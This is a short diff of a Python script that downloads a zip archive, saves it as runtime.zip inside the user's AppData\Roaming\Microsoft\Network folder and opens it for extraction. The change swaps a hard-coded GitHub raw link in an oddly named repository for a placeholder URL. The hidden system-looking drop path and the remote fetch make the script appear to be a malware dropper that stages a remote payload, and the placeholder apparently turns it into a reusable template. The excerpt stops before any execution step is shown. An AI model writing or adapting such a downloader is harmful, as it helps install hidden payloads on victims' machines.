@@ -21,7 +21,8 @@ except ImportError:
 user = getpass.getuser()
 
 def main():
-    r = requests.get("https://github.com/spxctrzz/adawdgsdfagdf/raw/refs/heads/main/runtime.zip")
+    url = "YOUR_ZIP_DOWNLOAD_URL"
+    r = requests.get(url)
     with open(fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\runtime.zip", "wb") as f:
         f.write(r.content)
     with ZipFile(fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\runtime.zip", "r") as f:
